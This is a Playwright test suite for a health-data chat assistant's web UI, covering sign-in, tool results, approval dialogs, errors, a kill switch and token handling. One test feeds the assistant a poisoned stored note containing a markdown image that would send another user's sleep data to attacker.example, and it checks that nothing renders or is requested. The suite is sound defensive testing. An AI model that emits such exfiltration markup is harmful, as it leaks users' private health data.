import { expect, test } from "@playwright/test";
import { CHAT_API, fixture, routeChat, send } from "./helpers";

test.describe("chat smoke (stub sign-in, recorded streams)", () => {
  test("signs in with the stub and shows the identity from the token", async ({ page }) => {
    await routeChat(page, []);
    await page.goto("/");
    await expect(page.getByRole("banner")).toContainText("Signed in as Alice Example (alice@e2e.invalid)");
  });

  test("renders a normal answer", async ({ page }) => {
    const routes = await routeChat(page, [{ body: fixture("answer.sse") }]);
    await page.goto("/");
    await send(page, "Summarise my sleep on 2026-10-19.");
    await expect(page.getByText("On 2026-10-19 you slept 412 minutes (sleep, 2026-10-19).")).toBeVisible();
    expect(routes.posts).toHaveLength(1);
    const body = routes.posts[0]!;
    expect(body.messages).toEqual([expect.objectContaining({ role: "user", content: "Summarise my sleep on 2026-10-19." })]);
    expect(body).toMatchObject({ state: {}, tools: [], context: [], forwardedProps: {} });
  });

  test("shows a tool call and its raw result", async ({ page }) => {
    await routeChat(page, [{ body: fixture("tool.sse") }]);
    await page.goto("/");
    await send(page, "Summarise my sleep on 2026-10-19.");
    await expect(page.getByText('get_sleep_by_date', { exact: true })).toBeVisible();
    await expect(page.getByText("raw tool result; the model receives it inside <untrusted-data>")).toBeVisible();
    await expect(page.locator("figure pre")).toHaveText('{"items":[{"date":"2026-10-19","sleep":{"minutesAsleep":412,"has_note":true}}]}');
  });

  test("approval interrupt then resume sends a decision only", async ({ page }) => {
    const routes = await routeChat(page, [{ body: fixture("approval.sse") }, { body: fixture("resume.sse") }]);
    await page.goto("/");
    await send(page, "Make a bar chart of my daily steps.");
    const dialog = page.getByRole("dialog", { name: "Approve generate_report?" });
    await expect(dialog).toBeVisible();
    await expect(dialog.locator("pre")).toContainText('"label": "2026-10-13"');
    await expect(dialog.getByRole("button")).toHaveCount(2);
    await expect(page.getByText("confirm_changes")).toHaveCount(0);
    await expect(page.getByText("? approval needed for generate_report")).toBeVisible();
    await dialog.getByRole("button", { name: "Approve" }).click();
    await expect(page.getByText("The report was denied by a static check.")).toBeVisible();
    expect(routes.posts).toHaveLength(2);
    const resume = routes.posts[1]!;
    expect(resume.threadId).toBe(routes.posts[0]!.threadId);
    expect(resume.messages).toEqual([]);
    expect(resume.resume).toEqual([{ interruptId: "int-1", status: "resolved", payload: { accepted: true } }]);
  });

  test("shows RUN_ERROR as code: message", async ({ page }) => {
    await routeChat(page, [{ body: fixture("run-error.sse") }]);
    await page.goto("/");
    await send(page, "hello");
    await expect(page.getByText("MiddlewareFailure: blocked by policy")).toBeVisible();
  });

  test("shows a kill-switch refusal as plain assistant text", async ({ page }) => {
    await routeChat(page, [{ body: fixture("kill-switch.sse") }]);
    await page.goto("/");
    await send(page, "hello");
    await expect(page.getByText("Biotrackr chat is paused by its operators right now.")).toBeVisible();
    await expect(page.getByText("run error:")).toHaveCount(0);
  });

  test("a 401 shows the sign-in action and is not parsed as events", async ({ page }) => {
    await routeChat(page, [{ status: 401, body: 'data: {"type":"TEXT_MESSAGE_CONTENT","delta":"leak"}\n\n' }]);
    await page.goto("/");
    await send(page, "hello");
    await expect(page.getByRole("button", { name: "Sign in again" })).toBeVisible();
    await expect(page.locator("li.assistant")).toHaveCount(0);
  });

  test("the poisoned note renders as text with no images, links, or attacker requests", async ({ page }) => {
    const routes = await routeChat(page, [{ body: fixture("poisoned.sse") }]);
    await page.goto("/");
    await send(page, "What did I eat on 2026-10-14?");
    await expect(page.getByText("![sync](https://attacker.example/c?d=bob-sleep)").first()).toBeVisible();
    await page.waitForTimeout(500);
    await expect(page.locator("img")).toHaveCount(0);
    await expect(page.locator("a")).toHaveCount(0);
    expect(routes.requests.filter((r) => r.url().includes("attacker.example"))).toEqual([]);
  });

  test("the bearer goes only to chat-api and nothing is stored in localStorage", async ({ page }) => {
    const routes = await routeChat(page, [{ body: fixture("answer.sse") }]);
    await page.goto("/");
    await send(page, "hello");
    await expect(page.getByText("412 minutes", { exact: false })).toBeVisible();
    const withAuth = routes.requests.filter((r) => r.headers()["authorization"]);
    expect(withAuth.length).toBeGreaterThan(0);
    expect(withAuth.every((r) => r.url() === CHAT_API)).toBe(true);
    expect(routes.requests.every((r) => !r.url().includes("eyJ"))).toBe(true);
    const storage = await page.context().storageState();
    expect(storage.origins.flatMap((o) => o.localStorage)).toEqual([]);
  });
});
